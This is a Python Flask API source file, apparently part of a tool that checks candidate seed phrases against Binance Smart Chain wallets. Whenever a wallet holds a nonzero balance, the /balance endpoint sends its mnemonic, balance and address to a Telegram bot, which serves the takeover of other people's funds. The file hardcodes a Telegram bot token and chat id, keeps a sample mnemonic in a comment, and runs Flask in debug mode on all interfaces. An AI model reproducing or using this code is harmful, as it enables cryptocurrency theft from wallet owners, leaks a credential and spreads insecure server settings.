from flask import Flask, jsonify, request
from web3 import Web3
import config
import mysql.connector
import random, sys, os, json
import validadores
import array_palavras
import requests
from decimal import *
#import resource
#resource.setrlimit(resource.RLIMIT_AS, ((10 * 1024 * 1024 * 16),(10 * 1024 * 1024 * 16)))
#print(resource.getrlimit(resource.RLIMIT_AS))

select_em = 100
deleta_em = 200

app = Flask(__name__)

wallet=[]
palavras2=[]

w3 = Web3()
rand = random.randint(0,32)
web3 = Web3(Web3.HTTPProvider(validadores.bsc[int(rand)]))
w3.eth.account.enable_unaudited_hdwallet_features()

@app.route('/balance',methods=['POST'])
def balance2():
    os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
    p = request.get_json()
    global wallet
    global balance
    global mnemonic
    wallet = str(p['wallet'])
    balance = str(0)
    mnemonic = str(p['mnemonic'])
    print(wallet)

    #ntoken=["Binance-Peg BSC-USD",                       "Binance-Peg BUSD Token",                    "Wrapped BNB",                                "Baby Doge Coin",                             "Binance-Peg Ethereum Token",                 "PancakeSwap Token",                          "Wall Street Games",                           "Binance-Peg SHIBA INU Token",                "Binance-Peg USD Coin"]                                     
    #token= ["0x55d398326f99059fF775485246999027B3197955","0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56","0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", "0xc748673057861a797275CD8A068AbB95A902e8de", "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "0xA58950F05FeA2277d2608748412bf9F802eA4901", "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"]
    #abi = json.loads('[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"tokens","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeSub","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"tokens","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeDiv","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeMul","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"constant":true,"inputs":[{"name":"tokenOwner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"uint256"},{"name":"b","type":"uint256"}],"name":"safeAdd","outputs":[{"name":"c","type":"uint256"}],"payable":false,"stateMutability":"pure","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"tokenOwner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"tokens","type":"uint256"}],"name":"Approval","type":"event"}]')
    #for i in range(0,len(token)):
    #    contract = web3.eth.contract(address=token[i], abi=abi)
    #    balanceOf = contract.functions.balanceOf(carteira_origem).call()
    #    b = (Decimal(balanceOf) / Decimal(10**6))
    #    print(ntoken[i]+": "+str(b))
    #0x7aE75C09B52bB02B41E1280B600423929a732208
    #0x0fbE543abeC29487B56895c8a9AC909cDE2C7AE2
    #0xd437319A06384c55D8A0D979d12a59e8DeA9D2A3

    
    
    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
    try:    
        balance = web3.eth.get_balance(wallet)
    except:
        pass
    else:
        print("wallet "+str(wallet)+" balance "+str(web3.from_wei(balance,'ether'))+" mnemonic "+str(mnemonic))
        if balance != 0:
            #print(f"count: "+str('%018.0f' % total_wallet)+"/"+str('%018.0f' % count)+" - time: "+str("{:6.4f}".format(total))+" - "+str(w)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(valida_palavras_validadores.bsc[int(rand)]))     
            payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(web3.from_wei(balance,'ether'))+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
            r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
            #arquivo = open("wallet_"+str(id)+".txt", "a")
            #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")                                    
    return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(web3.from_wei(balance,'ether'))+"", "mnemonic":""+str(mnemonic)+""})
    sys.exit()
    
PORTA=int(sys.argv[1])
os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
app.run(host='0.0.0.0',port=PORTA,debug=True)
os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
#C:/Users/roney/AppData/Local/Programs/Python/Python311/python.exe c:/Users/roney/Documents/GitHub/python_bsc/api.py 80